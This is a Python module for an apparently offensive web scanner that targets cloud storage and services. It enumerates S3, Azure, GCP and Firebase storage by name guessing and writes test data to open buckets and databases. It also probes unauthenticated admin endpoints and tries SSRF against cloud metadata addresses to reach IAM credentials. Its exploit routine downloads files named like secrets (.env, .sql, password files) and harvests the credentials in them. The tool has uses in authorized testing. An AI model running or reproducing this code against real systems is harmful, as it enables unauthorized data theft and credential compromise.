import re
import json
import asyncio
from typing import Dict, List, Set, Optional
from urllib.parse import urlparse, urljoin
from modules.base import BaseModule


class CloudModule(BaseModule):
    name = "cloud"
    description = "Cloud Misconfiguration Scanner"
    exploitable = True
    
    s3_regions = [
        "us-east-1", "us-east-2", "us-west-1", "us-west-2",
        "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1",
        "ap-southeast-1", "ap-southeast-2", "ap-northeast-1", "ap-northeast-2",
        "ap-south-1", "sa-east-1", "ca-central-1",
    ]
    
    bucket_patterns = [
        "{domain}", "{domain}-backup", "{domain}-dev", "{domain}-staging",
        "{domain}-prod", "{domain}-assets", "{domain}-static", "{domain}-media",
        "{domain}-uploads", "{domain}-files", "{domain}-data", "{domain}-logs",
        "{domain}-images", "{domain}-cdn", "{domain}-public", "{domain}-private",
        "backup-{domain}", "dev-{domain}", "staging-{domain}", "prod-{domain}",
        "{company}", "{company}-backup", "{company}-assets", "{company}-cdn",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.exposed_buckets: List[Dict] = []
        
        parsed = urlparse(target)
        domain = parsed.netloc or parsed.path
        domain = domain.split(":")[0]
        
        company = domain.split(".")[0]
        
        await self._find_s3_buckets(domain, company)
        await self._find_azure_storage(domain, company)
        await self._find_gcp_storage(domain, company)
        await self._find_firebase(domain, company)
        await self._find_exposed_services(target)
        await self._check_cloud_metadata(target)
        
        return self.findings
    
    async def _find_s3_buckets(self, domain: str, company: str):
        buckets_to_check: Set[str] = set()
        self.current_region: Optional[str] = None
        
        for pattern in self.bucket_patterns:
            bucket = pattern.replace("{domain}", domain.replace(".", "-"))
            bucket = bucket.replace("{company}", company)
            buckets_to_check.add(bucket)
        
        buckets_to_check.add(domain.replace(".", "-"))
        buckets_to_check.add(company)
        
        sem = asyncio.Semaphore(10)
        
        async def check_bucket(bucket):
            async with sem:
                await self._check_s3_bucket(bucket)
        
        tasks = [check_bucket(b) for b in list(buckets_to_check)[:30]]
        await asyncio.gather(*tasks)
    
    async def _check_s3_bucket(self, bucket: str):
        urls = [
            f"https://{bucket}.s3.amazonaws.com",
            f"https://s3.amazonaws.com/{bucket}",
        ]
        
        for url in urls:
            try:
                resp = await self.http.get(url, timeout=5)
            except:
                continue
            
            if not resp.get("status"):
                continue
            
            status = resp.get("status")
            body = resp.get("text", "")
            
            if status == 200:
                if "<ListBucketResult" in body:
                    files = re.findall(r"<Key>([^<]+)</Key>", body)
                    
                    self.exposed_buckets.append({
                        "type": "s3",
                        "bucket": bucket,
                        "access": "list",
                        "files": files[:20],
                    })
                    
                    self.add_finding(
                        "CRITICAL",
                        f"S3 Bucket Publicly Listable: {bucket}",
                        url=url,
                        evidence=f"Found {len(files)} files"
                    )
                    
                    await self._check_s3_write(bucket)
                    return
                
                elif "<?xml" not in body and len(body) > 100:
                    self.add_finding(
                        "HIGH",
                        f"S3 Bucket Publicly Readable: {bucket}",
                        url=url,
                        evidence="Bucket returns content"
                    )
                    return
            
            elif status == 403:
                if "AccessDenied" in body:
                    self.add_finding(
                        "INFO",
                        f"S3 Bucket Exists (Access Denied): {bucket}",
                        url=url,
                        evidence="Bucket exists but not publicly accessible"
                    )
                    return
    
    async def _check_s3_write(self, bucket: str):
        test_file = f"lantern-test-{bucket[:8]}.txt"
        url = f"https://{bucket}.s3.amazonaws.com/{test_file}"
        
        try:
            resp = await self.http.put(url, data="test", headers={"Content-Type": "text/plain"})
            
            if resp.get("status") in [200, 201]:
                self.add_finding(
                    "CRITICAL",
                    f"S3 Bucket Publicly Writable: {bucket}",
                    url=url,
                    evidence="Successfully uploaded test file"
                )
                
                await self.http.delete(url)
        except:
            pass
    
    async def _find_azure_storage(self, domain: str, company: str):
        accounts = [
            domain.replace(".", ""),
            company,
            f"{company}storage",
            f"{company}data",
            f"{company}backup",
        ]
        
        containers = ["public", "data", "files", "uploads", "backup", "assets", "images", "media"]
        
        for account in accounts[:5]:
            for container in containers[:5]:
                url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
                
                try:
                    resp = await self.http.get(url, timeout=5)
                except:
                    continue
                
                if resp.get("status") == 200:
                    body = resp.get("text", "")
                    
                    if "<EnumerationResults" in body:
                        blobs = re.findall(r"<Name>([^<]+)</Name>", body)
                        
                        self.exposed_buckets.append({
                            "type": "azure_blob",
                            "account": account,
                            "container": container,
                            "access": "list",
                            "files": blobs[:20],
                        })
                        
                        self.add_finding(
                            "CRITICAL",
                            f"Azure Blob Container Publicly Listable",
                            url=url,
                            evidence=f"Account: {account}, Container: {container}, Files: {len(blobs)}"
                        )
    
    async def _find_gcp_storage(self, domain: str, company: str):
        buckets = [
            domain.replace(".", "-"),
            company,
            f"{company}-backup",
            f"{company}-data",
            f"{company}-assets",
        ]
        
        for bucket in buckets[:5]:
            url = f"https://storage.googleapis.com/{bucket}"
            
            try:
                resp = await self.http.get(url, timeout=5)
            except:
                continue
            
            if resp.get("status") == 200:
                body = resp.get("text", "")
                
                if "<ListBucketResult" in body:
                    files = re.findall(r"<Key>([^<]+)</Key>", body)
                    
                    self.exposed_buckets.append({
                        "type": "gcp_storage",
                        "bucket": bucket,
                        "access": "list",
                        "files": files[:20],
                    })
                    
                    self.add_finding(
                        "CRITICAL",
                        f"GCP Storage Bucket Publicly Listable: {bucket}",
                        url=url,
                        evidence=f"Found {len(files)} files"
                    )
    
    async def _find_firebase(self, domain: str, company: str):
        projects = [
            company,
            domain.replace(".", "-"),
            f"{company}-app",
            f"{company}-prod",
        ]
        
        for project in projects[:5]:
            url = f"https://{project}.firebaseio.com/.json"
            
            try:
                resp = await self.http.get(url, timeout=5)
            except:
                continue
            
            if resp.get("status") == 200:
                body = resp.get("text", "")
                
                if body and body != "null":
                    try:
                        data = json.loads(body)
                        if data:
                            self.exposed_buckets.append({
                                "type": "firebase",
                                "project": project,
                                "access": "read",
                            })
                            
                            self.add_finding(
                                "CRITICAL",
                                f"Firebase Database Publicly Readable: {project}",
                                url=url,
                                evidence=f"Data exposed: {str(data)[:100]}..."
                            )
                            
                            secrets = self.extract_secrets(body)
                            if secrets:
                                self.add_exploit_data(f"firebase_{project}_secrets", secrets)
                    except:
                        pass
            
            url = f"https://{project}.firebaseio.com/.json"
            try:
                resp = await self.http.put(url, json={"test": "lantern"}, timeout=5)
                
                if resp.get("status") == 200:
                    self.add_finding(
                        "CRITICAL",
                        f"Firebase Database Publicly Writable: {project}",
                        url=url,
                        evidence="Successfully wrote test data"
                    )
            except:
                pass
    
    async def _find_exposed_services(self, target: str):
        base = self.get_base(target)
        
        services = [
            ("/_all_dbs", "CouchDB", "couchdb"),
            ("/_cat/indices", "Elasticsearch", "elasticsearch"),
            ("/_cluster/health", "Elasticsearch", "elasticsearch"),
            ("/solr/admin/cores", "Solr", "solr"),
            ("/info", "Redis Commander", "redis"),
            ("/server-status", "Apache Status", "apache"),
            ("/nginx_status", "Nginx Status", "nginx"),
            ("/api/v1/pods", "Kubernetes API", "kubernetes"),
            ("/v2/_catalog", "Docker Registry", "docker"),
            ("/metrics", "Prometheus Metrics", "prometheus"),
            ("/debug/pprof", "Go pprof", "golang"),
            ("/actuator", "Spring Actuator", "spring"),
            ("/actuator/env", "Spring Actuator Env", "spring"),
            ("/actuator/heapdump", "Spring Actuator Heap", "spring"),
            ("/console", "H2 Console", "h2"),
            ("/jolokia", "Jolokia", "jolokia"),
            ("/hazelcast/rest/cluster", "Hazelcast", "hazelcast"),
        ]
        
        for path, service_name, service_type in services:
            url = urljoin(base, path)
            
            try:
                resp = await self.http.get(url, timeout=5)
            except:
                continue
            
            if resp.get("status") == 200:
                body = resp.get("text", "")
                
                if len(body) > 10 and "error" not in body.lower()[:100]:
                    severity = "CRITICAL" if service_type in ["elasticsearch", "kubernetes", "docker", "spring"] else "HIGH"
                    
                    self.add_finding(
                        severity,
                        f"Exposed Service: {service_name}",
                        url=url,
                        evidence=f"Service accessible without authentication"
                    )
                    
                    secrets = self.extract_secrets(body)
                    if secrets:
                        self.add_exploit_data(f"{service_type}_secrets", secrets)
    
    async def _check_cloud_metadata(self, target: str):
        metadata_endpoints = [
            ("http://169.254.169.254/latest/meta-data/", "AWS EC2"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
            ("http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack"),
            ("http://169.254.169.254/v1/", "DigitalOcean"),
        ]
        
        base = self.get_base(target)
        
        for endpoint, cloud in metadata_endpoints:
            params = ["url", "redirect", "next", "file", "path", "page", "data", "load"]
            
            for param in params[:3]:
                test_url = f"{base}?{param}={endpoint}"
                
                try:
                    resp = await self.http.get(test_url, timeout=5)
                except:
                    continue
                
                if resp.get("status") == 200:
                    body = resp.get("text", "")
                    
                    indicators = ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey", "project-id"]
                    
                    for indicator in indicators:
                        if indicator in body:
                            self.add_finding(
                                "CRITICAL",
                                f"Cloud Metadata Accessible via SSRF ({cloud})",
                                url=test_url,
                                evidence=f"Indicator: {indicator}"
                            )
                            
                            secrets = self.extract_secrets(body)
                            if secrets:
                                self.add_exploit_data(f"{cloud.lower()}_metadata", secrets)
                            
                            return
    
    async def exploit(self, target, finding):
        results = {
            "exposed_buckets": self.exposed_buckets,
            "downloaded_files": [],
        }
        
        for bucket in self.exposed_buckets[:5]:
            if bucket.get("files"):
                for file in bucket["files"][:10]:
                    sensitive = [".env", "config", "backup", ".sql", "password", "secret", "key", "credential"]
                    
                    if any(s in file.lower() for s in sensitive):
                        file_url = self._get_file_url(bucket, file)
                        
                        try:
                            resp = await self.http.get(file_url, timeout=10)
                            
                            if resp.get("status") == 200:
                                content = resp.get("text", "")[:10000]
                                
                                results["downloaded_files"].append({
                                    "bucket": bucket.get("bucket") or bucket.get("container"),
                                    "file": file,
                                    "content_preview": content[:500],
                                })
                                
                                secrets = self.extract_secrets(content)
                                if secrets:
                                    self.add_exploit_data(f"bucket_secrets_{file}", secrets)
                        except:
                            pass
        
        if results["downloaded_files"]:
            self.add_exploit_data("cloud_exploit_results", results)
        
        return results
    
    def _get_file_url(self, bucket: Dict, file: str) -> str:
        bucket_type = bucket.get("type")
        
        if bucket_type == "s3":
            return f"https://{bucket['bucket']}.s3.amazonaws.com/{file}"
        elif bucket_type == "gcp_storage":
            return f"https://storage.googleapis.com/{bucket['bucket']}/{file}"
        elif bucket_type == "azure_blob":
            return f"https://{bucket['account']}.blob.core.windows.net/{bucket['container']}/{file}"
        
        return ""
